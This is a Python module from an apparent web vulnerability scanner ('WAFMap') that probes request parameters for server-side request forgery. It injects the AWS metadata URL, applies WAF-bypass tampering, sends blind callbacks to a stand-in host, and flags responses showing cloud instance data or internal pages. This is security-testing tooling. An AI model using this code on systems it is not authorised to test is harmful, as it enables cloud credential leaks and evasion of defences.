from .tampering import apply_tampering
from . import bypass_oracle
import uuid

AWS_META = "http://169.254.169.254/latest/meta-data/"


def load_payloads_from_file(filename="payloads/ssrf.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception:
        return [AWS_META]


def run_ssrf_test(engine, injection_point, param_name, level, waf_bypass_enabled, waf_name=None):
    url = injection_point['url']
    method = injection_point['method']

    base_resp = engine._send_request(url, method=method)
    original_text = base_resp.text if base_resp is not None else ""

    base = {p: 'x' for p in injection_point['parameters']}

    forced_technique = None
    if waf_bypass_enabled:
        forced_technique = bypass_oracle.probe_and_get_technique(engine, url, method, base, param_name, 'ssrf', waf_name)

    payloads = load_payloads_from_file()

    for payload in payloads:
        blind_id = None
        current_payload = payload

        if "SSRF_CALLBACK" in payload:
            blind_id = str(uuid.uuid4())[:8]
            current_payload = f"http://callback.wafmap.test/{blind_id}"

        final_payload = apply_tampering(current_payload, 'ssrf', waf_bypass_enabled, waf_name, technique=forced_technique)

        if waf_bypass_enabled:
            resp = engine._send_request_raw(url, method, base, param_name, final_payload)
        else:
            data = base.copy() if method == 'POST' else None
            params = base.copy() if method == 'GET' else None
            if method == 'POST':
                data[param_name] = final_payload
            else:
                params[param_name] = final_payload
            resp = engine._send_request(url, method=method, data=data, params=params)

        if resp is not None:
            if AWS_META in current_payload:
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    details = "AWS Data"
                    if waf_bypass_enabled and forced_technique:
                        details += f" - Technique de bypass utilisée : {forced_technique}"
                    engine.add_vulnerability("SSRF (Cloud Leak)", url, final_payload, details, parameter=param_name)
                    continue

            if "Bienvenue sur le Lab WAFMap" in resp.text:
                if "Bienvenue sur le Lab WAFMap" not in original_text:
                    details = "Accès interne"
                    if waf_bypass_enabled and forced_technique:
                        details += f" - Technique de bypass utilisée : {forced_technique}"
                    engine.add_vulnerability("SSRF (Loopback)", url, final_payload, details, parameter=param_name)
                    continue

            if blind_id and engine.config['verbose']:
                print(f"[INFO] Blind SSRF sent: {blind_id}")
